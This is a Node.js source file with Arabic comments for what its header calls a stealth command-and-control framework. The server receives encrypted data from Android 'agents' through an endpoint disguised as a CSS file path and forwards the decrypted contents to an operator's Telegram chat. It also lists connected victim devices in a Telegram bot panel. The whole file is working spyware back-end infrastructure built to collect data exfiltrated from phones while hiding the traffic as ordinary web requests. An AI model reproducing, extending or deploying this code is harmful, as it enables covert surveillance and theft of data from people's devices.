// app.js - إطار الإدارة والتحكم الشبح المتكامل والمطابق للتشفير (2026)
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;
const ENCRYPTION_SECRET = process.env.AGENT_SECRET || 'BaseSystemZeroDaySecureKey2026';

if (!token || !chatId) {
    console.error('[-] خطأ: لم يتم ضبط متغيرات البيئة للتوكن أو المعرف بشكل صحيح.');
    process.exit(1);
}

const app = express();
const appBot = new telegramBot(token, { polling: true });

const appClients = new Map();

app.use(express.text({ type: '*/*', limit: '50mb' }));

// 🌟 التصحيح الذهبي: اشتقاق المفتاح مباشرة من بايتات النص ليتطابق 100% مع كود الأندرويد الحالي (Kotlin)
const secretBuffer = Buffer.from(ENCRYPTION_SECRET, 'utf8');
const CRYPTO_KEY = Buffer.alloc(32); // حجز 32 بايت (AES-256)
secretBuffer.copy(CRYPTO_KEY, 0, 0, Math.min(secretBuffer.length, 32));

// --- موديول فك التشفير المتقدم القياسي (AES-256-GCM) ---
function decryptPayload(base64String) {
    try {
        const rawJson = Buffer.from(base64String, 'base64').toString('utf8');
        const packet = JSON.parse(rawJson);
        
        const iv = Buffer.from(packet.v, 'hex');
        const authTag = Buffer.from(packet.g, 'hex');
        const encryptedData = Buffer.from(packet.d, 'hex');

        const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, iv);
        decipher.setAuthTag(authTag);
        
        let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

// --- مسار التمويه الشبكي المستقر المتوافق مع Render ---
app.post('/assets/web/style-min.css', async (req, res) => {
    try {
        const syncMode = req.headers['x-sync-mode'] || 'generic';
        const agentModel = req.headers['x-agent-model'] || 'Unknown-Device';
        const agentId = req.headers['x-agent-id'] || 'GhostAgent';

        // تسجيل الجهاز بمجرد ملامسة النبضة للشبكة لضمان ظهوره في كل الأحوال
        appClients.set(agentId, { model: agentModel, lastSeen: Date.now() });

        const decryptedRaw = decryptPayload(req.body);
        if (!decryptedRaw) {
            // تنبيه ذكي في حال استمرار اختلاف المفتاح لمعرفة السبب
            await appBot.sendMessage(chatId, `⚠️ <b>اتصال وارد من ${agentModel} ولكن فك التشفير تالف!</b>\nتأكد من إعدادات سطر الـ AGENT_SECRET في Render.`);
            return res.status(200).send('/* Active Telemetry */');
        }

        const payload = JSON.parse(decryptedRaw);

        let telegramMessage = `📥 <b>بيانات مشفرة ناجحة من: ${agentModel}</b>\n`;
        telegramMessage += `📊 النوع: <code>${syncMode}</code>\n\n`;
        telegramMessage += `<pre>${JSON.stringify(payload, null, 2)}</pre>`;

        await appBot.sendMessage(chatId, telegramMessage, { parse_mode: 'HTML' });
        res.status(200).send('/* Synchronized */');
    } catch (err) {
        res.sendStatus(200); 
    }
});

// === لوحة تحكم تليجرام بالأزرار ===
const mainKeyboard = {
    parse_mode: 'HTML',
    reply_markup: {
        keyboard: [['📱 الاجهزة المتصلة']],
        resize_keyboard: true
    }
};

appBot.on('message', async (msg) => {
    const text = msg.text;
    if (String(msg.chat.id) !== String(chatId)) return;

    if (text === '/start' || text === 'تفعيل') {
        await appBot.sendMessage(chatId, '⚙️ <b>تم تفعيل لوحة تحكم النظام بنجاح.</b>\nبانتظار النبضات المشفرة من الأندرويد...', mainKeyboard);
    } 
    else if (text === '📱 الاجهزة المتصلة') {
        if (appClients.size === 0) {
            await appBot.sendMessage(chatId, '📭 <b>لا توجد أجهزة متصلة بالخادم حالياً.</b>', mainKeyboard);
        } else {
            let reply = '<b>👥 الأجهزة والأنودات النشطة حالياً:</b>\n\n';
            appClients.forEach((client, id) => {
                const status = (Date.now() - client.lastSeen < 60000) ? '🟢 ONLINE' : '⚫ SLEEPING';
                reply += `• 📱 <b>الموديل:</b> ${client.model}\n🆔 <b>ID:</b> <code>${id}</code>\n📊 <b>الحالة:</b> ${status}\n\n`;
            });
            await appBot.sendMessage(chatId, reply, mainKeyboard);
        }
    }
});

app.get('/', (req, res) => res.status(200).send('Service Active'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] خادم الإدارة يعمل الآن على المنفذ: ${PORT}`);
});
